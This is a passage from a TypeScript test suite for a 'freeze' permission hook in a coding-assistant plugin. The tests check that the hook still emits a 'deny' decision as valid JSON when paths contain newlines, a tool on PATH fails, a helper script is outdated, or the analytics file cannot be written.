        const rec = lastRecord(path.join(pluginData, 'analytics', 'skill-usage.jsonl'));
        expect(rec.event).toBe('hook_fire');
        expect(rec.skill).toBe('freeze');
        expect(fs.existsSync(path.join(fakeHome, '.gstack', 'analytics'))).toBe(false);
      });
    });
  });

  // NTFS rejects a newline in a directory name.
  test.skipIf(process.platform === 'win32')('a GSTACK_HOME ending in a newline round-trips exactly (writer %q and reader sentinel agree)', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-nl-'));
    const nlDir = path.join(base, 'root\n');
    fs.mkdirSync(nlDir);
    fs.writeFileSync(path.join(nlDir, 'freeze-dir.txt'), BOUNDARY);
    try {
      const { output } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE), {
        GSTACK_HOME: nlDir, HOME: base, CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '',
      });
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  // The fake tool is prepended with a POSIX ':' PATH separator.
  test.skipIf(process.platform === 'win32')('an unexpected set -e death inside the hook (a tool on PATH failing) DENIES via the EXIT backstop instead of exiting with no JSON', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-backstop-'));
    const fakeBin = path.join(base, 'bin');
    fs.mkdirSync(fakeBin);
    fs.writeFileSync(path.join(fakeBin, 'sed'), '#!/bin/sh\nexit 1\n');
    fs.chmodSync(path.join(fakeBin, 'sed'), 0o755);
    try {
      withFreezeDir(BOUNDARY, (stateDir) => {
        const { exitCode, output } = runHook(FREEZE_SCRIPT, freezeInput('/Users/dev/project/src/x.ts'),
          freezeEnv(stateDir, { PATH: `${fakeBin}:${process.env.PATH ?? ''}` }));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('failed unexpectedly');
      });
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  test('a hook helper from an older install that lacks gstack_hook_state_root DENIES (fail closed), never exit 127', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-oldhelper-'));
    const freezeBin = path.join(base, 'freeze', 'bin');
    const carefulBin = path.join(base, 'careful', 'bin');
    fs.mkdirSync(freezeBin, { recursive: true });
    fs.mkdirSync(carefulBin, { recursive: true });
    fs.copyFileSync(FREEZE_SCRIPT, path.join(freezeBin, 'check-freeze.sh'));
    const helper = fs.readFileSync(HOOK_EXTRACT, 'utf-8');
    const start = helper.indexOf('gstack_hook_state_root() {');
    const end = helper.indexOf('\n}\n', start) + 3;
    fs.writeFileSync(path.join(carefulBin, 'hook-extract.sh'), helper.slice(0, start) + helper.slice(end));
    try {
      withFreezeDir(BOUNDARY, (stateDir) => {
        const { exitCode, output } = runHook(path.join(freezeBin, 'check-freeze.sh'), freezeInput('/Users/dev/project/src/x.ts'), freezeEnv(stateDir));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        // 'out of date' is the helper-without-function branch; the plain
        // helpers-unavailable deny also says 'fail closed', so pin the specific one.
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('out of date');
      });
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  test('an unwritable analytics sink never changes the decision: deny is still emitted as valid JSON', () => {
    withFreezeDir(BOUNDARY, (gstackHome) => {
      // `analytics` is a regular FILE, so mkdir -p and the >> append both fail.
      fs.writeFileSync(path.join(gstackHome, 'analytics'), 'not a directory');
      withEmptyDir((fakeHome) => {
        const { exitCode, output, raw } = runHook(FREEZE_SCRIPT, freezeInput(OUTSIDE), {
          GSTACK_HOME: gstackHome, HOME: fakeHome, CLAUDE_PLUGIN_DATA: '', CLAUDE_PLUGIN_ROOT: '',
        });
        expect(exitCode).toBe(0);
        expect(() => JSON.parse(raw)).not.toThrow();
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(fs.readFileSync(path.join(gstackHome, 'analytics'), 'utf-8')).toBe('not a directory');
      });
    });
  });
});
